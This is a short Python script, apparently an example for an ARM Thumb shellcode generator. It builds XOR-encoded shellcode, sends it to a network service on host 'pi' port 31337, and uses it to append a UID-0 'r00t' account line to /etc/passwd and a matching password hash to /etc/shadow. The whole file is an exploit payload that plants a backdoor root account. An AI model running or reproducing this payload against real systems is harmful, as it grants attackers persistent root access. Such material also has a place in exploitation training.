#!python

from TesterModule import *
import sys

HOST = 'pi'
PORT = 31337

def Run(data, fname):
    """appendwrite shellcode example

    Args: 
        data(str): user information

        fname(str): file name to write
    """

    # ARMSCGen Thumb Class
    scgen = thumbSCGen()
    
    # generates chmod with options
    #   fname(str): file name
    scode  = scgen.appendwrite(fname, 0)
    scode += scgen.exit(0)

    # compiles shellcode
    scode_binary = CompileSC(scode, isThumb=True)

    # make an encoder with XOR key and compiles
    xor_encoder_with_scode_binary = MakeXorShellcode( scode_binary )

    print printHex(xor_encoder_with_scode_binary)

    (s, f) = makeSocket(HOST, PORT)
    f.write(xor_encoder_with_scode_binary + '\n')
    f.write(szID)
    f.write(szPW)
    s.close()
    
if __name__ == '__main__':
    # for /etc/passwd
    szID = 'r00t:x:0:0:,,,:/root/:/bin/bash'
    # for /etc/shadow
    szPW = 'r00t:$6$WZzoBfXk$xTzKN08pKX6SqnoC7nT/mzzYZDHOT6srIv03Tkzkoz0I6Cia055aNnA6UCF4hGHx.9stOfRNt79QQd4OWJ4GO/:16314:0:99999:7:::'

    Run(szID, '/etc/passwd')
    Run(szPW, '/etc/shadow')
